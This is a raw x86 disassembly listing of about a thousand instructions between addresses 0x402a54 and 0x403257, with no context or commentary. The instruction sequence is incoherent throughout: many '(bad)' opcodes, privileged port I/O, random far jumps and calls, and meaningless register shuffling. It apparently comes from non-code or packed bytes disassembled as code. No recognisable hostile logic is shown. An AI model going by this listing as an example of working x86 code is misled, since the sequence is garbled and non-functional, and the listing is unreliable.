  402a54:	xchg   ebp,eax
  402a55:	sub    BYTE PTR [ebp-0xae0c464],ah
  402a5b:	xlat   BYTE PTR ds:[ebx]
  402a5c:	pop    ecx
  402a5d:	ret    0xb8f8
  402a60:	rol    BYTE PTR [ecx-0x61101efe],0xf4
  402a67:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a69:	cld    
  402a6a:	stos   BYTE PTR es:[edi],al
  402a6b:	xchg   ecx,eax
  402a6c:	nop
  402a6d:	loop   0x402a2d
  402a6f:	dec    ebx
  402a70:	fidivr WORD PTR [edx-0x42]
  402a73:	repnz stos BYTE PTR es:[edi],al
  402a75:	xchg   ebx,eax
  402a76:	mov    gs,WORD PTR [eax-0x1d13158]
  402a7c:	mov    edx,0x12511135
  402a81:	adc    al,0x4b
  402a83:	ror    BYTE PTR [edi-0x6b6ecf9e],1
  402a89:	push   0x6def8418
  402a8e:	(bad)  
  402a8f:	popa   
  402a90:	ret    0x60e1
  402a93:	ds jl  0x402a4d
  402a96:	mov    esi,ebp
  402a98:	dec    ebp
  402a99:	fdiv   QWORD PTR [edi-0x1142045a]
  402a9f:	sahf   
  402aa0:	jp     0x402ab6
  402aa2:	lds    esi,FWORD PTR [edi-0x4c]
  402aa5:	pusha  
  402aa6:	xchg   esi,eax
  402aa7:	push   edx
  402aa8:	je     0x402ad0
  402aaa:	data16 (bad) 
  402aac:	fucomip st,st(0)
  402aae:	jmp    FWORD PTR [ecx+0x44d2e668]
  402ab4:	mov    edx,0xb9682ad1
  402ab9:	inc    edx
  402aba:	inc    esp
  402abb:	inc    ecx
  402abc:	sar    BYTE PTR [ecx+0x3e882eb3],cl
  402ac2:	test   edx,ebx
  402ac4:	push   esi
  402ac5:	add    DWORD PTR [ecx-0x55],esi
  402ac8:	fcom   QWORD PTR [edx-0x71763b31]
  402ace:	out    0x89,eax
  402ad0:	cmp    DWORD PTR [ebp+ebx*4+0x58c0f243],edx
  402ad7:	rcl    DWORD PTR [ebx+ebx*2+0x75],0x8a
  402adc:	jns    0x402b41
  402ade:	outs   dx,BYTE PTR ds:[esi]
  402adf:	test   DWORD PTR [edi-0x5d],0x1cf43747
  402ae6:	cmp    BYTE PTR [edi+0x417afb30],ch
  402aec:	fsubr  st,st(3)
  402aee:	or     al,0xcf
  402af0:	add    ah,dl
  402af2:	aam    0x3
  402af4:	bound  eax,QWORD PTR [esi+0x5c7d17a]
  402afa:	std    
  402afb:	out    0x52,al
  402afd:	pop    ebp
  402afe:	mov    DWORD PTR [ebx-0x7005121a],ebp
  402b04:	mov    eax,ds:0xba538b19
  402b09:	mov    ds:0xce460eb6,eax
  402b0e:	lea    ebx,[edi]
  402b10:	mov    ecx,0xc8c523fb
  402b15:	jae    0x402b75
  402b17:	in     eax,dx
  402b18:	ja     0x402aa0
  402b1a:	jb     0x402ac0
  402b1c:	cmp    BYTE PTR [edi-0x3967a257],ch
  402b22:	xor    esp,DWORD PTR [esi-0x4a00ef8e]
  402b28:	xchg   esp,eax
  402b29:	and    ecx,ebx
  402b2b:	mov    eax,0x4e28bc37
  402b30:	test   dh,dh
  402b32:	loop   0x402b18
  402b34:	in     al,0x42
  402b36:	les    edi,FWORD PTR [eax]
  402b38:	jnp    0x402b9f
  402b3a:	shl    esi,cl
  402b3c:	in     al,0x75
  402b3e:	push   ss
  402b3f:	cwde   
  402b40:	inc    esp
  402b41:	sub    bl,al
  402b43:	xchg   ebp,eax
  402b44:	adc    cl,ah
  402b46:	shl    BYTE PTR [esi-0x7d],0x4f
  402b4a:	add    eax,0x3878bcda
  402b4f:	aas    
  402b50:	add    DWORD PTR [eax-0x513ed321],edx
  402b56:	shr    BYTE PTR [ecx-0x274c542d],cl
  402b5c:	push   ss
  402b5d:	push   esi
  402b5e:	push   0x15c51e49
  402b63:	mov    edi,DWORD PTR [esi+0x61a75b81]
  402b69:	pop    esp
  402b6a:	pop    ebp
  402b6b:	retf   
  402b6c:	mov    al,0xde
  402b6e:	xor    cl,BYTE PTR [ecx+0x38733bbf]
  402b74:	into   
  402b75:	xchg   DWORD PTR [esi],esp
  402b77:	sbb    eax,0x53e157a9
  402b7c:	and    DWORD PTR [ebx-0x38],ebp
  402b7f:	(bad)  
  402b80:	mov    edi,0x478212db
  402b85:	adc    ah,0xf7
  402b88:	cmp    ch,BYTE PTR [ebp+0x76717b5e]
  402b8e:	fidiv  WORD PTR [ebp+0x28dede3a]
  402b94:	loopne 0x402b8f
  402b96:	mov    WORD PTR [ecx],ss
  402b98:	jae    0x402bd5
  402b9a:	pop    eax
  402b9b:	fimul  WORD PTR [esi+0x1e]
  402b9e:	jmp    0x402bd4
  402ba0:	xchg   esi,eax
  402ba1:	push   eax
  402ba2:	add    eax,0x87d96ee5
  402ba7:	or     esp,DWORD PTR [ecx-0x620dd309]
  402bad:	mov    edx,0x95157704
  402bb2:	adc    ch,BYTE PTR [bx+si+0x4d]
  402bb6:	hlt    
  402bb7:	lahf   
  402bb8:	shr    BYTE PTR ds:0x80fda763,1
  402bbe:	fsubr  st,st(5)
  402bc0:	cmp    al,0xeb
  402bc2:	arpl   WORD PTR [edx+0x8],bp
  402bc5:	lea    ecx,[eax+edx*1]
  402bc8:	ror    DWORD PTR [ebx],0x2c
  402bcb:	and    esi,DWORD PTR [ecx+0x2a]
  402bce:	add    al,0xa9
  402bd0:	aas    
  402bd1:	in     eax,dx
  402bd2:	pop    esi
  402bd3:	loopne 0x402b76
  402bd5:	mov    BYTE PTR cs:[edx-0x34d2f075],al
  402bdc:	pop    es
  402bdd:	push   es
  402bde:	mov    al,ds:0xab631f44
  402be3:	cmp    BYTE PTR [ebx+0x6d8b338b],al
  402be9:	jmp    0x402be8
  402beb:	mov    DWORD PTR [esi-0x11],0xbc30a9f
  402bf2:	daa    
  402bf3:	mov    ds:0x6d0b15ba,eax
  402bf8:	(bad)  
  402bfa:	fnstenv [eax+ebx*2]
  402bfd:	inc    edx
  402bfe:	int    0xc0
  402c00:	push   ebx
  402c01:	lahf   
  402c02:	std    
  402c03:	popa   
  402c04:	mov    ds:0x6e61c71e,eax
  402c09:	pusha  
  402c0a:	jmp    0x710f9dda
  402c0f:	add    DWORD PTR [ecx],0x50
  402c12:	jns    0x402bde
  402c14:	popf   
  402c15:	cld    
  402c16:	add    BYTE PTR [edi+0x46],bh
  402c19:	cmp    ch,bh
  402c1b:	xchg   DWORD PTR [ecx-0x1590acc6],ecx
  402c21:	fdivr  st,st(1)
  402c23:	int    0x2a
  402c25:	and    ah,BYTE PTR [ecx+0x67c26658]
  402c2b:	das    
  402c2c:	xor    DWORD PTR [esi+ecx*2],0xffffffef
  402c30:	pop    ss
  402c31:	xchg   edx,eax
  402c32:	push   ebx
  402c33:	iret   
  402c34:	cld    
  402c35:	xchg   BYTE PTR [ecx+0x1bc01a8b],bl
  402c3b:	rcr    ebp,1
  402c3d:	cmp    BYTE PTR [esi],al
  402c3f:	adc    al,0x4a
  402c41:	xchg   esi,eax
  402c42:	loopne 0x402bce
  402c44:	mov    edi,0x27895d28
  402c49:	push   esi
  402c4a:	loop   0x402cc7
  402c4c:	cmp    ah,BYTE PTR [ebp-0x1c]
  402c4f:	mov    edx,0xc55ef59f
  402c54:	repz jge 0x402c8b
  402c57:	jno    0x402c3b
  402c59:	dec    eax
  402c5a:	or     eax,0xa29fbb1e
  402c5f:	or     DWORD PTR es:[ebp-0x5],0x7
  402c64:	add    DWORD PTR [eax+edx*2-0x66e1a3ae],edx
  402c6b:	rol    esp,0xb1
  402c6e:	iret   
  402c6f:	jge    0x402ce9
  402c71:	inc    BYTE PTR [edx]
  402c73:	loop   0x402c0c
  402c75:	push   ds
  402c76:	and    al,0xde
  402c79:	and    bl,BYTE PTR [ecx+0x52]
  402c7c:	(bad)  
  402c7d:	inc    ebx
  402c7e:	ret    
  402c7f:	dec    ecx
  402c80:	fild   QWORD PTR ds:[eax-0x68]
  402c84:	imul   edi,DWORD PTR [ebx],0xffffffed
  402c87:	stos   BYTE PTR es:[edi],al
  402c88:	adc    BYTE PTR [edi],0x8b
  402c8b:	add    BYTE PTR [eax-0x3b],cl
  402c8e:	xlat   BYTE PTR ds:[ebx]
  402c8f:	imul   ebx,DWORD PTR [ebx+0x446f1ba1],0xf
  402c96:	out    dx,eax
  402c97:	imul   edx,DWORD PTR [edi+0x6e],0x77
  402c9b:	stos   BYTE PTR es:[edi],al
  402c9c:	ins    DWORD PTR es:[edi],dx
  402c9d:	xchg   BYTE PTR [ebx-0x33],al
  402ca0:	mov    eax,0xf4848e2
  402ca5:	mov    ah,0x6c
  402ca7:	mov    eax,0xa874ac33
  402cac:	lods   eax,DWORD PTR ds:[esi]
  402cad:	outs   dx,DWORD PTR ds:[esi]
  402cae:	pop    eax
  402caf:	mov    al,ds:0x23cc9e0c
  402cb4:	jmp    0x5e51:0xc2125d2c
  402cbb:	repnz pop ecx
  402cbd:	gs out dx,eax
  402cbf:	lock inc eax
  402cc1:	mov    ah,0x5
  402cc3:	xor    al,0x1b
  402cc5:	jp     0x402c8f
  402cc7:	gs xor eax,0xd34992f
  402ccd:	mov    al,0xd1
  402ccf:	or     ebp,DWORD PTR [ebp+edi*8-0x376e2f0b]
  402cd6:	cdq    
  402cd7:	aam    0x8b
  402cd9:	std    
  402cda:	out    0x6c,al
  402cdc:	jns    0x402d45
  402cde:	retf   
  402cdf:	loop   0x402d4f
  402ce1:	fs adc eax,ebp
  402ce4:	cwde   
  402ce5:	push   cs
  402ce6:	xchg   edi,eax
  402ce7:	mov    bl,0xe3
  402ce9:	xor    esi,DWORD PTR [edx-0x57]
  402cec:	add    ah,BYTE PTR [ebp+0x1e8c0e16]
  402cf2:	push   edi
  402cf3:	jo     0x402d3b
  402cf5:	push   ecx
  402cf6:	iret   
  402cf7:	jecxz  0x402d2e
  402cf9:	fdivr  st,st(7)
  402cfb:	(bad)  [esi-0x228c80c0]
  402d01:	retf   0x52f9
  402d04:	or     BYTE PTR [ebp+0x2bf8ae76],dl
  402d0a:	dec    edi
  402d0b:	push   0xffffffd8
  402d0d:	mov    edx,DWORD PTR [edx+0x4cc4b909]
  402d13:	jg     0x402d10
  402d15:	aas    
  402d16:	addr16 push esi
  402d18:	mov    ebx,eax
  402d1a:	mov    ds,ebx
  402d1c:	fstp   QWORD PTR [edx+0x71]
  402d1f:	xchg   esi,ebx
  402d21:	lods   eax,DWORD PTR ds:[esi]
  402d22:	xor    ebp,0x2df1a086
  402d28:	or     eax,0x89593f34
  402d2d:	xchg   ebx,eax
  402d2e:	and    ecx,ecx
  402d30:	mov    ch,0x1a
  402d32:	shr    DWORD PTR [edx+ebx*1-0x2f8bb52],cl
  402d39:	fst    DWORD PTR [eax+0x55c0561a]
  402d3f:	xchg   DWORD PTR [ebx+ecx*2+0x77d3e9be],ebx
  402d46:	cmp    BYTE PTR [eax-0x74793af5],dh
  402d4c:	pop    ss
  402d4d:	cs lock xchg esi,eax
  402d50:	loope  0x402dcf
  402d52:	(bad)  
  402d53:	sti    
  402d54:	inc    ebp
  402d55:	mov    WORD PTR [ebx-0x1935dd87],cs
  402d5b:	sub    DWORD PTR [ebp+0x48],edi
  402d5e:	jl     0x402da2
  402d60:	adc    eax,0x33d813d5
  402d65:	xor    al,0x85
  402d67:	nop
  402d68:	or     bh,bh
  402d6a:	lahf   
  402d6b:	and    esp,DWORD PTR [ecx+0xaa1f54]
  402d71:	pushf  
  402d72:	scas   al,BYTE PTR es:[edi]
  402d73:	push   esp
  402d74:	adc    BYTE PTR ds:0x3f973e87,al
  402d7a:	ret    0xe999
  402d7d:	inc    eax
  402d7e:	mov    eax,0x9e962486
  402d83:	jnp    0x402d3b
  402d85:	xchg   ebp,eax
  402d86:	jmp    0x402dda
  402d88:	daa    
  402d89:	xor    edx,DWORD PTR [eax-0x25]
  402d8c:	adc    bl,BYTE PTR [ebx+ecx*4-0x41b312b1]
  402d93:	inc    esp
  402d94:	daa    
  402d95:	mov    ds:0x668eb461,al
  402d9a:	lods   al,BYTE PTR ds:[esi]
  402d9b:	xor    esi,DWORD PTR [edi-0x6e6840aa]
  402da1:	hlt    
  402da2:	outs   dx,BYTE PTR ds:[esi]
  402da3:	add    eax,0x28c66bc1
  402da8:	mov    bh,BYTE PTR [ecx]
  402daa:	call   0x4a1b:0xd5621254
  402db1:	mov    ecx,0xcf893ada
  402db6:	mov    al,ds:0xea592f02
  402dbb:	mov    edi,0xa9bd4252
  402dc0:	ins    DWORD PTR es:[edi],dx
  402dc1:	repz inc ebp
  402dc3:	pop    edx
  402dc4:	cmp    al,0xb2
  402dc6:	aam    0x58
  402dc8:	cwde   
  402dc9:	retf   0xb602
  402dcc:	pop    ebp
  402dcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402dce:	push   eax
  402dcf:	mov    ebp,DWORD PTR [esi+0x7de0c2e1]
  402dd5:	mov    al,ds:0xa8881c04
  402dda:	aam    0x4e
  402ddc:	sahf   
  402ddd:	sbb    DWORD PTR [eax],edi
  402ddf:	(bad)  
  402de0:	and    eax,0x8ddd7f56
  402de5:	jecxz  0x402e5d
  402de7:	stc    
  402de8:	mov    al,0x7b
  402dea:	sbb    edi,DWORD PTR [edx+0x2f]
  402ded:	xchg   edx,eax
  402dee:	dec    ebx
  402def:	rcr    ecx,0x67
  402df2:	push   0x75d41301
  402df7:	and    dh,BYTE PTR [ecx]
  402df9:	out    dx,al
  402dfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402dfb:	fistp  WORD PTR [esi]
  402dfd:	nop
  402dfe:	imul   ebp,DWORD PTR [edi],0x79
  402e01:	sub    al,0x9
  402e03:	mov    esp,0x5c5255a5
  402e08:	adc    BYTE PTR [ebp+edi*4+0x7f09ad1b],bl
  402e0f:	cmp    DWORD PTR [edx],eax
  402e11:	(bad)  
  402e13:	ffree  st(6)
  402e15:	dec    ecx
  402e16:	mov    dh,0x53
  402e18:	retf   
  402e19:	xor    al,0x93
  402e1b:	into   
  402e1c:	push   cs
  402e1d:	ins    BYTE PTR es:[edi],dx
  402e1e:	push   ecx
  402e1f:	push   esi
  402e20:	cmp    al,0xd
  402e22:	leave  
  402e23:	(bad)  
  402e24:	or     eax,0xca7dde31
  402e29:	push   ebp
  402e2a:	out    0x50,eax
  402e2c:	xchg   esp,eax
  402e2d:	imul   esp,DWORD PTR [eax-0x3a24ca80],0x49
  402e34:	push   edi
  402e35:	int3   
  402e36:	pop    ss
  402e37:	dec    eax
  402e38:	pop    ecx
  402e39:	and    al,0xa7
  402e3b:	dec    esi
  402e3c:	int    0xda
  402e3e:	jmp    0xdb64:0x631b29ae
  402e45:	lods   eax,DWORD PTR ds:[esi]
  402e46:	into   
  402e47:	imul   edi,DWORD PTR [edi+ebp*8],0x65
  402e4b:	data16 fistp DWORD PTR ds:0x1f324830
  402e52:	inc    eax
  402e53:	jecxz  0x402e75
  402e55:	cdq    
  402e56:	fs or  al,0x29
  402e59:	xchg   ebp,eax
  402e5a:	call   0xe0d9:0x4335ead1
  402e61:	(bad)  
  402e62:	cs mov edx,0xc5fadc3f
  402e68:	out    dx,eax
  402e69:	sbb    bl,BYTE PTR [esi-0x72]
  402e6c:	stos   DWORD PTR es:[edi],eax
  402e6d:	(bad)  
  402e6e:	sahf   
  402e6f:	retf   0xe802
  402e72:	xchg   esi,eax
  402e73:	call   0xf9fd2003
  402e78:	sbb    ebx,DWORD PTR [ebx+0x5fcbb8fe]
  402e7e:	pusha  
  402e7f:	jae    0x402e16
  402e81:	mov    ecx,0x4f114a40
  402e86:	in     eax,0xb6
  402e88:	int    0x1d
  402e8a:	rcr    BYTE PTR es:[esi+0x1a],1
  402e8e:	in     eax,dx
  402e8f:	clc    
  402e90:	or     al,BYTE PTR [esi+0x27]
  402e93:	adc    al,BYTE PTR [edx]
  402e95:	xchg   ecx,eax
  402e96:	add    bh,BYTE PTR [esi]
  402e98:	outs   dx,BYTE PTR ds:[esi]
  402e99:	cmp    edx,0x31
  402e9c:	cwde   
  402e9d:	pop    ebp
  402e9e:	sub    esi,DWORD PTR [ebp+0x167abe23]
  402ea4:	cwde   
  402ea5:	xor    eax,0x36e4ce75
  402eaa:	adc    bh,BYTE PTR [eax+0x67b61305]
  402eb0:	fbld   TBYTE PTR [esi+0x1e635766]
  402eb6:	jp     0x402e5d
  402eb8:	inc    ebx
  402eb9:	mov    ebx,0x272d1d92
  402ebe:	sbb    eax,0x63c964ea
  402ec3:	mov    ebp,0xf58e703b
  402ec8:	pop    edx
  402ec9:	xor    DWORD PTR [esi],esp
  402ecb:	push   ebp
  402ecc:	mov    eax,0x7e558a40
  402ed1:	sbb    al,BYTE PTR [ecx]
  402ed3:	mov    DWORD PTR [edi],eax
  402ed5:	inc    edi
  402ed6:	jns    0x402f1b
  402ed8:	in     eax,0x82
  402eda:	sahf   
  402edb:	pop    ebp
  402edc:	mov    edx,0xcd46f39e
  402ee1:	sbb    ebp,eax
  402ee3:	sub    eax,DWORD PTR [eax]
  402ee5:	out    0x1,eax
  402ee7:	jle    0x402f1e
  402ee9:	mov    edx,0xd0fd79e
  402eee:	in     eax,0x2c
  402ef0:	and    eax,0x11d22629
  402ef5:	cmp    eax,0xe68332c
  402efa:	mov    esp,0xeee1139e
  402eff:	sar    DWORD PTR [ebp+0x27caf037],cl
  402f05:	push   edi
  402f06:	dec    eax
  402f07:	sbb    BYTE PTR [edx+0x59830fe7],dh
  402f0d:	cmp    DWORD PTR [esi+ebp*4],0xfd78056c
  402f14:	std    
  402f15:	icebp  
  402f16:	cdq    
  402f17:	xlat   BYTE PTR ds:[ebx]
  402f18:	test   eax,0xd17ce44a
  402f1d:	push   edi
  402f1e:	or     DWORD PTR [esi+0x320b6ec],0xffffffbb
  402f25:	cmp    eax,0x3ae9376a
  402f2a:	das    
  402f2b:	adc    DWORD PTR [ebx+0x4ee9ea2f],esp
  402f31:	adc    ah,BYTE PTR [ebp+0x23402d0]
  402f37:	lds    edx,FWORD PTR [ebp-0x62]
  402f3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f3b:	imul   esp,DWORD PTR [esi],0xffffffdc
  402f3e:	sbb    ah,BYTE PTR [edi-0x31]
  402f41:	pusha  
  402f42:	fidivr DWORD PTR [ecx]
  402f44:	xchg   ecx,eax
  402f45:	sti    
  402f46:	mov    gs,WORD PTR [esi-0x3d]
  402f49:	push   ebx
  402f4a:	mov    esp,0x2900d26
  402f4f:	sbb    al,bh
  402f51:	mov    BYTE PTR [edi+0x341dc65f],ch
  402f57:	call   0x8aef:0x2035c737
  402f5e:	push   cs
  402f5f:	scas   eax,DWORD PTR es:[edi]
  402f60:	mov    es,esi
  402f62:	xchg   ecx,eax
  402f63:	mov    esp,DWORD PTR [eax+0x75]
  402f66:	icebp  
  402f67:	in     al,0x5b
  402f69:	fcmovne st,st(5)
  402f6b:	or     DWORD PTR [ebx-0x73f4af87],esp
  402f71:	mov    dl,0x5b
  402f73:	jmp    0x402fde
  402f75:	enter  0x738f,0xb7
  402f79:	adc    dl,BYTE PTR [edi+0x273a4568]
  402f7f:	mov    bl,dl
  402f81:	mov    al,ds:0x53e7c668
  402f86:	enter  0x847e,0xb2
  402f8a:	iret   
  402f8b:	imul   esi,DWORD PTR [edi-0x726178c],0xa25d4977
  402f95:	ret    
  402f96:	sub    eax,0x4e6f867b
  402f9b:	aad    0x5c
  402f9d:	mov    BYTE PTR [ebx+0xf6d9449],bl
  402fa3:	xor    al,0xd3
  402fa5:	mov    edi,0x2548ef50
  402faa:	cmp    DWORD PTR [ebx+0x2e],ebx
  402fad:	out    dx,eax
  402fae:	xchg   esp,eax
  402faf:	fdivr  DWORD PTR [ebx]
  402fb1:	daa    
  402fb2:	mov    bl,0x27
  402fb4:	repz dec ecx
  402fb6:	adc    bl,cl
  402fb8:	and    al,0xf6
  402fba:	adc    dl,dh
  402fbc:	adc    ah,ch
  402fbe:	jp     0x402fbb
  402fc0:	rol    BYTE PTR [edi-0x21581090],cl
  402fc6:	mov    ch,0x4e
  402fc8:	or     eax,ebx
  402fca:	inc    esi
  402fcb:	mov    al,0xd2
  402fcd:	add    ebp,esp
  402fcf:	push   cs
  402fd0:	push   0xe641071d
  402fd5:	jne    0x402f91
  402fd7:	test   eax,0x7c262672
  402fdc:	add    eax,0x975543d2
  402fe1:	push   ebx
  402fe2:	mov    bh,0x61
  402fe4:	mov    ch,0xcb
  402fe6:	stc    
  402fe7:	add    DWORD PTR [eax+0x453aa71d],ecx
  402fed:	jb     0x40300b
  402fef:	scas   eax,DWORD PTR es:[edi]
  402ff0:	mov    ecx,DWORD PTR [ebx+0x38]
  402ff3:	lahf   
  402ff4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ff5:	pop    edi
  402ff6:	lea    edi,[ecx+0x4c1bac7f]
  402ffc:	(bad)  
  402ffd:	out    dx,al
  402ffe:	shl    DWORD PTR [ebx+0x26],cl
  403001:	out    0x9e,eax
  403003:	cli    
  403004:	dec    edx
  403005:	push   edi
  403006:	sbb    BYTE PTR [ebp+0x2d27c197],dl
  40300c:	adc    edi,ebp
  40300e:	sub    al,BYTE PTR [esi-0x33]
  403011:	enter  0xdcb,0x47
  403015:	(bad)  
  403016:	pusha  
  403017:	popf   
  403018:	sub    al,BYTE PTR [edx]
  40301a:	sbb    eax,0x5c759838
  40301f:	js     0x402ff1
  403021:	pop    edx
  403022:	jae    0x40307a
  403024:	test   eax,0x66934b8c
  403029:	stos   BYTE PTR es:[edi],al
  40302a:	mov    ah,0x1e
  40302c:	stc    
  40302d:	lods   al,BYTE PTR ds:[esi]
  40302e:	cmp    esp,ebx
  403030:	mov    ebx,0xd7b044e7
  403035:	or     cl,BYTE PTR [ecx+0x5e]
  403038:	add    BYTE PTR [ebx+edx*2-0x75],dl
  40303c:	out    dx,eax
  40303d:	and    al,0x5a
  40303f:	hlt    
  403040:	ds into 
  403042:	popf   
  403043:	xor    ah,ah
  403045:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403046:	js     0x402fde
  403048:	aas    
  403049:	cmp    ch,0xfd
  40304c:	add    BYTE PTR [edx-0x7e],0xd6
  403050:	test   al,0x11
  403052:	sub    DWORD PTR [edx+0x46c370a8],esi
  403058:	xor    DWORD PTR [esi],0x17efc712
  40305e:	fwait
  40305f:	pop    edi
  403060:	and    edi,DWORD PTR [eax+0x6]
  403063:	xor    DWORD PTR [eax-0x1d201568],ebx
  403069:	repnz xchg esi,eax
  40306b:	out    dx,eax
  40306c:	adc    esp,ebp
  40306e:	xor    ch,BYTE PTR [esi-0x4de1b839]
  403074:	in     eax,dx
  403075:	and    ebp,esi
  403077:	push   cs
  403078:	aas    
  403079:	ror    DWORD PTR [ebp+0x38],0x61
  40307d:	pop    edx
  40307e:	retf   0xa9d5
  403081:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403082:	adc    ch,BYTE PTR [esi]
  403084:	pop    ebx
  403085:	loop   0x4030d6
  403087:	(bad)  
  403088:	in     eax,dx
  403089:	add    BYTE PTR [ecx],ch
  40308b:	stos   DWORD PTR es:[edi],eax
  40308c:	fnsave [ebx-0x12]
  40308f:	and    bl,ah
  403091:	jge    0x403088
  403093:	and    BYTE PTR [ebx],cl
  403095:	xchg   ebp,eax
  403096:	je     0x403092
  403098:	inc    edx
  403099:	ficomp DWORD PTR [eax-0x73]
  40309c:	xchg   BYTE PTR [ecx],ah
  40309e:	dec    ebx
  40309f:	adc    BYTE PTR [esi+0x44],bl
  4030a2:	add    DWORD PTR [esi+0x4d],ecx
  4030a5:	out    0xf2,eax
  4030a7:	(bad)  
  4030a8:	in     eax,dx
  4030a9:	jmp    0x75d6:0x53b4282b
  4030b0:	mov    ds:0xa9010ab6,al
  4030b5:	das    
  4030b6:	mov    ebp,DWORD PTR [ecx+0x3bb037cc]
  4030bc:	fld    DWORD PTR [edi-0x32]
  4030bf:	push   0x129af866
  4030c4:	sar    DWORD PTR [ecx-0x3b85bc85],0x9d
  4030cb:	or     eax,0xdfa03c21
  4030d0:	fs xor esi,eax
  4030d3:	jnp    0x4030df
  4030d5:	mov    edi,0x6fea8e
  4030da:	jmp    0x1c4998fc
  4030df:	add    BYTE PTR [ebp+0x801e0c],bl
  4030e5:	imul   esp,DWORD PTR [ebx-0x463515],0x21046423
  4030ef:	mov    ds:0x9fc0fc31,al
  4030f4:	xor    cl,BYTE PTR [ebp+0x19]
  4030f7:	xchg   ecx,eax
  4030f8:	and    eax,0x204371d
  4030fd:	sub    DWORD PTR [eax+0x35f285dc],ebp
  403103:	das    
  403104:	mov    ebx,0x298b64bd
  403109:	mov    ds,ebp
  40310b:	(bad)
  40310f:	(bad)  
  403110:	mov    dl,0xa6
  403112:	ja     0x40313c
  403114:	neg    BYTE PTR [esp+eax*1]
  403117:	imul   esi,esi,0xffffffbb
  40311a:	add    cl,BYTE PTR [ebx]
  40311c:	xchg   ebx,eax
  40311d:	lods   eax,DWORD PTR ds:[esi]
  40311e:	mov    bh,0xf2
  403120:	sbb    edi,DWORD PTR [eax-0x47a7d5cc]
  403126:	retf   0xdc73
  403129:	imul   ebx,esi,0x1f
  40312c:	fbld   TBYTE PTR [edi+0x6d]
  40312f:	stos   BYTE PTR es:[edi],al
  403130:	jae    0x40318a
  403132:	push   edx
  403133:	and    al,0xf8
  403135:	pop    ecx
  403136:	jb     0x403177
  403138:	adc    al,0x6f
  40313a:	sbb    BYTE PTR [ebx],0xb8
  40313d:	out    dx,eax
  40313e:	in     al,0xcb
  403140:	jne    0x40319c
  403142:	aas    
  403143:	or     bh,BYTE PTR [esi-0xa541c96]
  403149:	sbb    edx,ecx
  40314b:	jne    0x403142
  40314d:	(bad)  
  40314e:	mov    bh,0x34
  403150:	xchg   ebx,eax
  403151:	ret    0xc77
  403154:	pusha  
  403155:	cmp    cl,BYTE PTR [edx+ecx*8+0x4e]
  403159:	or     eax,0x91ba3665
  40315e:	sahf   
  40315f:	iret   
  403160:	dec    ebp
  403161:	ds xchg edx,eax
  403163:	xchg   ebx,eax
  403164:	and    ebp,esp
  403166:	mov    bh,BYTE PTR [ecx-0x5f]
  403169:	sbb    BYTE PTR [ebp-0xc],bl
  40316c:	inc    edi
  40316d:	pushf  
  40316e:	and    al,0x3
  403170:	stos   DWORD PTR es:[edi],eax
  403171:	pop    edi
  403172:	mov    al,0x60
  403174:	pop    esi
  403175:	test   eax,0x6649681c
  40317a:	add    al,0x1c
  40317c:	or     BYTE PTR [eax+eiz*1-0x7454e09e],bl
  403183:	and    eax,DWORD PTR [edi-0x4238cf32]
  403189:	jmp    0x403141
  40318b:	lods   eax,DWORD PTR ds:[esi]
  40318c:	xchg   ecx,eax
  40318d:	pusha  
  40318e:	aam    0x44
  403190:	ss cmp bl,dl
  403193:	dec    esi
  403194:	out    dx,al
  403195:	pop    ebp
  403196:	and    bl,BYTE PTR [ecx]
  403198:	cld    
  403199:	jl     0x403158
  40319b:	or     eax,0x89a86852
  4031a0:	dec    ecx
  4031a1:	or     ah,BYTE PTR [ebp+0x54]
  4031a4:	int3   
  4031a5:	int3   
  4031a6:	jbe    0x4031d3
  4031a8:	jl     0x40315c
  4031aa:	jnp    0x403229
  4031ac:	jl     0x403142
  4031ae:	mov    dh,0x28
  4031b0:	not    DWORD PTR [ecx+0x31]
  4031b3:	mul    BYTE PTR [ebp-0xb]
  4031b6:	mov    bl,0x6b
  4031b8:	shr    DWORD PTR [ebx-0x5b],0x17
  4031bc:	mov    edi,0x80ae1b93
  4031c1:	sub    DWORD PTR [ecx],0xffffffbb
  4031c4:	jbe    0x403219
  4031c6:	sub    BYTE PTR ds:0x35719d2e,bl
  4031cc:	and    DWORD PTR [esi],ecx
  4031ce:	ds das 
  4031d0:	or     dh,bh
  4031d2:	and    eax,0x36aa69f7
  4031d7:	in     al,dx
  4031d8:	js     0x403229
  4031da:	fwait
  4031db:	jmp    0x9e46f2c2
  4031e0:	push   es
  4031e1:	mov    ebx,0x4ce9568a
  4031e6:	inc    edi
  4031e7:	out    0x9a,eax
  4031e9:	ins    BYTE PTR es:[edi],dx
  4031ea:	add    esp,esi
  4031ec:	xor    al,0x6e
  4031ee:	sub    eax,0x59534e84
  4031f3:	xchg   ebx,eax
  4031f4:	sbb    al,0x26
  4031f6:	xchg   ebp,eax
  4031f7:	inc    ebx
  4031f8:	nop
  4031f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031fa:	pop    esp
  4031fb:	daa    
  4031fc:	mov    DWORD PTR [eax-0x39499ad4],0xbe70d630
  403206:	ror    ecx,cl
  403208:	dec    ebx
  403209:	dec    ebx
  40320a:	cmp    edi,DWORD PTR [edx+0x29d18ad4]
  403210:	mov    dh,al
  403212:	mov    DWORD PTR [ebx+ebx*1+0x77b3e5be],edi
  403219:	imul   esi,DWORD PTR [esi-0x11b7f45],0xffffff8f
  403220:	imul   eax,DWORD PTR [ecx+0x1601a19e],0xd63a27ba
  40322a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40322b:	mov    eax,ds:0x1d5c6e7c
  403230:	dec    esp
  403231:	sub    ebx,ebx
  403233:	sar    DWORD PTR [ebx],0xfa
  403236:	ror    BYTE PTR [edi-0x6c],cl
  403239:	xchg   ebx,eax
  40323a:	adc    al,0x4d
  40323c:	(bad)  
  40323d:	pop    edx
  40323e:	imul   edi,DWORD PTR [esi+ebp*2+0x9bc2e2],0x1e
  403246:	pushf  
  403247:	push   edi
  403248:	inc    esp
  403249:	sti    
  40324a:	inc    ebp
  40324b:	pop    ds
  40324c:	std    
  40324d:	inc    edx
  40324e:	aas    
  40324f:	test   BYTE PTR [ebx+eiz*4+0x1c],dl
  403253:	pop    ds
  403254:	(bad)  
  403256:	das    
  403257:	pop    ds
